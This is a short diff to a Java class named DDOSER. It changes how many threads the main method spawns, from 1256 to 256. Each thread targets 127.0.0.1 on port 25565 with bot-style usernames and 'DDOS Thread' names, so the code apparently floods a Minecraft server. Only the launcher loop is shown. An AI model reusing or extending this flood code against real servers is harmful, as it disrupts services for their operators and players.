@@ -64,7 +64,7 @@ public class DDOSER extends Thread {
 	
 	public static void main(String[] args) throws InterruptedException, UnknownHostException {
 		InetAddress address = InetAddress.getByName("127.0.0.1");
-		for(int i=0;i<1256;i++) {
+		for(int i=0;i<256;i++) {
 			DDOSER thread = new DDOSER("Dimples_1337_"+(i+1), address, 25565);
 			thread.setName("DDOS Thread#"+i);
 			thread.start();
